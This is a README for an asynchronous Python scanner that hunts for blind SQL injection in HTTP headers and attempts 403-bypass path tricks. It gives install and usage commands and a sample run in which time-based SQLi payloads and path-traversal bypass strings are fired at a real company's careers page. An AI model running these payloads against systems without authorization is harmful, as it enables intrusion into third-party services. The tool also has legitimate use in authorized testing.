
# Asynchronous Vulnerability Scanner

---

## Description
### Program to find blind SQLi in headers and bypass 403 code
- Based on [SqliSniper](https://github.com/highchoice/SqliSniperPLUS/tree/main)
- Based on [4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3/tree/main)
---

## Install:
```pycon
git clone 
cd AVScaner_Form
```
```pycon
1. Create a virtual environment:
    python -m venv .venv

2. Activate the virtual environment:
    On Windows:
    .venv\Scripts\activate
    
    On macOS/Linux:
    source .venv/bin/activate

pip install -r requirements.txt
# pip freeze > requirements.txt
```

---

## Preparing links before work:
### Tools:
- [uddup](https://github.com/rotemreiss/uddup)
- [p1radup](https://github.com/iambouali/p1radup)
- [urldedupe](https://github.com/ameenmaali/urldedupe)

```bash
uddup -s -u after_crawled_link.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | sort -u | urldedupe -s > crawled_final.txt
```

---

### Recommendations:
1. Do not use more than 10-20 concurrent threads, as the probability of false positives increases.
2. I don't recommend using the “--bypass_all” flag, as there are already about 4365 payloads per link and you can increase this number 18 times, which will lead to a very long scanning time per link.  It is better to use the “--bypass_only_false_positive” flush.

---

### Use:
```text
"-i", "--input", help="Path to the file with links for check", default="input_data/crawled_final.txt"
"-o", "--output", help="Output folder", default="output_report"
"-p", "--payloads", help="Path to file with payloads", default="wordlist/payloads_BSQLi.txt"
"-b", "--bypass", help="Path to file with payloads", default="wordlist/payloads_bypasses.txt"
"-c", "--concurrency", help="Number of concurrent requests per sec", default=10)
"-t", "--timeout", help="Request timeout", default=45 sec)
"-bypass_only_false_positive", "--bypass_only_false_positive", help="Only bypass results with code 403 with false positive triggering", default=None)
"-bypass_all", "--bypass_all", help="Bypass all results with code 403", default=None)
"-px", "--proxy", help="Proxy for intercepting requests (e.g., http://127.0.0.1:8080)"
```
```pycon
python AVScaner_SQLi_Header.py -c 10 

python AVScaner_SQLi_Header.py -c 10 -px http://127.0.0.1:8080

python AVScaner_SQLi_Header.py -c 10 -bypass_only_false_positive -px http://127.0.0.1:8080

python AVScaner_SQLi_Header.py -c 10 -bypass_all -px http://127.0.0.1:8080

python AVScaner_SQLi_Header.py -c 10 -i "input_data/crawled_final.txt" -p "wordlist/payloads_BSQLi.txt" 
```

### After scanning, check the **output_report** folder!

---

### Example

```bash
python AVScaner_SQLi_Header.py -c 10 -bypass_all -px http://127.0.0.1:8080

[*] Starting @ 13:07:45 2024-09-07
[*] Total number of wordlist/payloads_BSQLi.txt variants per link: 97
[*] Total number of wordlist/payloads_bypasses.txt variants per link: 18

Test URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 200 | Normal response time: 1.13sec
[*] Total number of payload options per link including header: 194

[1] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.07 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe"}
[2] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.07 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1;waitfor delay '10'--"}
[3] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.08 sec | Header: {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36);waitfor delay '10'--", 'X-Custom-IP-Authorization': '127.0.0.1'}
        [1] Bypass URL: https://www.anthropic.com/careers?_rsc=10d0v/../ | Status: 403 | Response time: 0.06 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe"}
        [2] Bypass URL: https://www.anthropic.com/careers?_rsc=10d0v/.;/ | Status: 403 | Response time: 0.07 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe"}
        [3] Bypass URL: https://www.anthropic.com/careers?_rsc=10d0v/%09 | Status: 403 | Response time: 0.07 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe"}

        [1] Bypass URL: https://www.anthropic.com/careers?_rsc=10d0v/%20 | Status: 403 | Response time: 0.05 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1;waitfor delay '10'--"}
        [2] Bypass URL: https://www.anthropic.com/careers?_rsc=10d0v//// | Status: 403 | Response time: 0.06 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1;waitfor delay '10'--"}
        [3] Bypass URL: https://www.anthropic.com/careers?_rsc=10d0v/.;/ | Status: 403 | Response time: 0.06 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1;waitfor delay '10'--"}
        [18] Bypass URL: https://www.anthropic.com/careers?_rsc=10d0v/%%%%2e%%%%2e/ | Status: 403 | Response time: 0.06 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe"}
[27] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.07 sec | Header: {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36or WAITFOR DELAY '10'", 'X-Custom-IP-Authorization': '127.0.0.1'}
[28] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 200 | Response time: 0.46 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': "127.0.0.1waitfor delay '10'--"}

[193] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.07 sec | Header: {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:89.0) Gecko/20100101 Firefox/89.0', 'X-Custom-IP-Authorization': "127.0.0.1));waitfor delay '10'--"}
[194] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 200 | Response time: 0.41 sec | Header: {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:89.0) Gecko/20100101 Firefox/89.0', 'X-Custom-IP-Authorization': "127.0.0.1';%5waitfor%5delay%5'10'%5--%5"}


[*] Finished @ 13:14:06 2024-09-07
[*] Duration: 0:04:45.962360
```



---
